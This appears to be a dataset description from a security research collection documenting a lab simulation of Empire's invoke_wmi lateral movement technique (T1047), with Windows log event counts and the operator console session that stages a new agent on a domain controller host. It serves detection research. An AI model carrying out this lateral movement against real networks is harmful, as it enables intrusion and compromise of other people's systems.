
# Empire Invoke WMI

An adversary can use powershell to execute a stager via WMI

## Technique(s) ID

T1047

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_invoke_wmi.tar.gz](./empire_invoke_wmi.tar.gz)

## Network Environment

Shire

## Time Taken

2019-03-19152813

## About this file

| log_name                                 | task                                                   |   events_count  |
|------------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | Pipeline Execution Details                             |            1039 |
| Windows PowerShell                       | Provider Lifecycle                                     |               6 |
| Windows PowerShell                       | Engine Lifecycle                                       |               1 |
| Security                                 | Filtering Platform Connection                          |             858 |
| Security                                 | Token Right Adjusted Events                            |             237 |
| Security                                 | Logon                                                  |              23 |
| Security                                 | Group Membership                                       |              20 |
| Security                                 | Logoff                                                 |              20 |
| Security                                 | Sensitive Privilege Use                                |              16 |
| Security                                 | Special Logon                                          |              15 |
| Security                                 | Detailed File Share                                    |              11 |
| Security                                 | Authorization Policy Change                            |               7 |
| Security                                 | File Share                                             |               6 |
| Security                                 | Kerberos Service Ticket Operations                     |               3 |
| Security                                 | Process Creation                                       |               3 |
| Security                                 | Process Termination                                    |               2 |
| Security                                 | Other Object Access Events                             |               1 |
| Microsoft-Windows-Sysmon/Operational     | Process accessed (rule: ProcessAccess)                 |             517 |
| Microsoft-Windows-Sysmon/Operational     | Registry object added or deleted (rule: RegistryEvent) |             454 |
| Microsoft-Windows-Sysmon/Operational     | Network connection detected (rule: NetworkConnect)     |             375 |
| Microsoft-Windows-Sysmon/Operational     | Image loaded (rule: ImageLoad)                         |             234 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Connected (rule: PipeEvent)                       |              48 |
| Microsoft-Windows-Sysmon/Operational     | File created (rule: FileCreate)                        |              22 |
| Microsoft-Windows-Sysmon/Operational     | Registry value set (rule: RegistryEvent)               |               6 |
| Microsoft-Windows-Sysmon/Operational     | Process Create (rule: ProcessCreate)                   |               4 |
| Microsoft-Windows-Sysmon/Operational     | RawAccessRead detected (rule: RawAccessRead)           |               4 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-PowerShell/Operational | Executing Pipeline                                     |             870 |
| Microsoft-Windows-PowerShell/Operational | PowerShell Console Startup                             |               2 |
| Microsoft-Windows-PowerShell/Operational | Execute a Remote Command                               |               1 |
| Microsoft-Windows-PowerShell/Operational | PowerShell Named Pipe IPC                              |               1 |
| Microsoft-Windows-PowerShell/Operational | Starting Command                                       |               1 |

## Empire Activity

```
(Empire: MPB3UHD1) > usemodule lateral_movement/invoke_wmi
(Empire: powershell/lateral_movement/invoke_wmi) > info

              Name: Invoke-WMI
            Module: powershell/lateral_movement/invoke_wmi
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @harmj0y

Description:
  Executes a stager on remote hosts using WMI.

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Listener     True        https                     Listener to use.                        
  CredID       False                                 CredID from the store to use.           
  ComputerName True        HR001.shire.com           Host[s] to execute the stager on, comma 
                                                     separated.                              
  Proxy        False       default                   Proxy to use for request (default, none,
                                                     or other).                              
  UserName     False                                 [domain\]username to use to execute     
                                                     command.                                
  ProxyCreds   False       default                   Proxy credentials                       
                                                     ([domain\]username:password) to use for 
                                                     request (default, none, or other).      
  UserAgent    False       default                   User-agent string to use for the staging
                                                     request (default, none, or other).      
  Password     False                                 Password to use to execute command.     
  Agent        True        MPB3UHD1                  Agent to run module on.                 

FDC01.shire.comhell/lateral_movement/invoke_wmi) > set ComputerName H 
(Empire: powershell/lateral_movement/invoke_wmi) > info   

              Name: Invoke-WMI
            Module: powershell/lateral_movement/invoke_wmi
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @harmj0y

Description:
  Executes a stager on remote hosts using WMI.

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Listener     True        https                     Listener to use.                        
  CredID       False                                 CredID from the store to use.           
  ComputerName True        HFDC01.shire.com          Host[s] to execute the stager on, comma 
                                                     separated.                              
  Proxy        False       default                   Proxy to use for request (default, none,
                                                     or other).                              
  UserName     False                                 [domain\]username to use to execute     
                                                     command.                                
  ProxyCreds   False       default                   Proxy credentials                       
                                                     ([domain\]username:password) to use for 
                                                     request (default, none, or other).      
  UserAgent    False       default                   User-agent string to use for the staging
                                                     request (default, none, or other).      
  Password     False                                 Password to use to execute command.     
  Agent        True        MPB3UHD1                  Agent to run module on.                 

(Empire: powershell/lateral_movement/invoke_wmi) > execute
[*] Tasked MPB3UHD1 to run TASK_CMD_WAIT
[*] Agent MPB3UHD1 tasked with task ID 5
[*] Tasked agent MPB3UHD1 to run module powershell/lateral_movement/invoke_wmi
(Empire: powershell/lateral_movement/invoke_wmi) > Invoke-Wmi executed on "HFDC01.shire.com"
[*] Sending POWERSHELL stager (stage 1) to 10.0.10.104
[*] New agent DECFWPHY checked in
[+] Initial agent DECFWPHY from 10.0.10.104 now active (Slack)
[*] Sending agent (stage 2) to DECFWPHY at 10.0.10.104

(Empire: powershell/lateral_movement/invoke_wmi) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 2MES3XN6 ps 172.18.39.105   IT001             SHIRE\pgustavo          powershell         4312   5/0.0    2019-03-19 14:22:50  https           
 G6BYHU4F ps 172.18.39.105   IT001             *SHIRE\pgustavo         powershell         9156   5/0.0    2019-03-19 14:22:51  https           
 MPB3UHD1 ps 172.18.39.105   IT001             *SHIRE\pgustavo         cmd                8148   5/0.0    2019-03-19 14:22:51  https           

 DECFWPHY ps 172.18.39.5     HFDC01            *SHIRE\Mmidge           powershell         904    5/0.0    2019-03-19 14:22:48  https           

(Empire: agents) > 
```